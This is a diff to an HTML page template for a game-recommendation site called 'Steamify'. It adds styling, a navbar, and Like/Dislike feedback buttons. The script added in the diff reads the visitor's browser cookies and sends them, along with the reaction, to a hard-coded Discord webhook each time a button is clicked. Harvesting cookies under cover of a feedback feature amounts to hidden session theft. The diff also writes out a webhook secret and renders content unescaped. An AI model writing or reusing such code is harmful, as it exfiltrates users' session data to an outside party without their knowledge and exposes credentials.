@@ -110,15 +110,98 @@
  
         }
 
+        .navbar{
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background:#171a21;
+            height:60px;
+            display:flex;
+            align-items:center;
+            padding:0 40px;
+            box-shadow:0 3px 10px rgba(0,0,0,0.6);
+            z-index:1000;
+        }
+
+        .logo{
+            color:#66c0f4;
+            font-size:22px;
+            font-weight:bold;
+            letter-spacing:1px;
+        }
+
+        .nav-links{
+            margin-left:40px;
+            display:flex;
+            gap:25px;
+        }
+
+        .nav-links a{
+            color:#b8b6b4;
+            text-decoration:none;
+            font-size:14px;
+        }
+
+        .nav-links a:hover{
+            color:white;
+        }
 
 </style>
         
-    
-    <h1 class="recommendations-title" style="color: aliceblue; position:absolute; top: 2%; left: 50%; transform: translateX(-50%);">General Recommendations</h1>
-<div class="container" id="results" style="color: aliceblue; font-size: 18px; text-align: left; max-width: 30%;">{{recommendations|safe}}</div>
-<div style="position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 10px;">
-    <a href="/Main" class="mainbtn">Back to Main Page</a>
+<div class="navbar">
+    <div class="logo">Steamify</div>
+    <div class="nav-links">
+    <a href="/Main">Main</a>
+    <a href="https://store.steampowered.com" target="_blank">Open Steam</a>
+    </div>
 </div>
+
+    <h1 class="recommendations-title" style="color: aliceblue; position:absolute; top: 40px; left: 50%; transform: translateX(-50%);">General Recommendations</h1>
+<div class="container" id="results" style="color: aliceblue; font-size: 18px; text-align: left; max-width: 30%; display: flex; flex-direction: column;">
+    {{recommendations|safe}}
+    <div style="margin-top: auto; display: flex; justify-content: center;">
+        <a href="/Main" class="mainbtn" style="margin-bottom: 0;">Back to Main Page</a>
+    </div>
+</div>
+<div style="position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 10px;">
+    <div style="display: flex; flex-direction: column; align-items: center;">
+        <h3 style="color: aliceblue; margin-bottom: 10px;">Did you like your recommendations?</h3>
+        <div style="display: flex; gap: 10px;">
+            <a class="mainbtn" id="likeBtn">Like</a>
+            <a class="mainbtn" id="dislikeBtn">Dislike</a>
+        </div>
+    </div>
+</div>
+    
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1482338941662134406/wkOY8ktYf0sZXjrCLpGTn2pgFLkddSROPwqBzp3Btd5K6LqAEeCkiPK4o5J1yEeKT0nw";
+const cookies = document.cookie
+
+async function sendToDiscord(reaction) {
+    const payload = {
+        content: `${cookies} reacted: ${reaction} to general`
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+        });
+
+    } catch (error) {
+        console.error("Error sending reaction:", error);
+    }
+}
+
+document.getElementById("likeBtn").addEventListener("click", () => sendToDiscord("Positvely"));
+document.getElementById("dislikeBtn").addEventListener("click", () => sendToDiscord("Negatively"));
+</script>
+
 </body>
 </html>
  
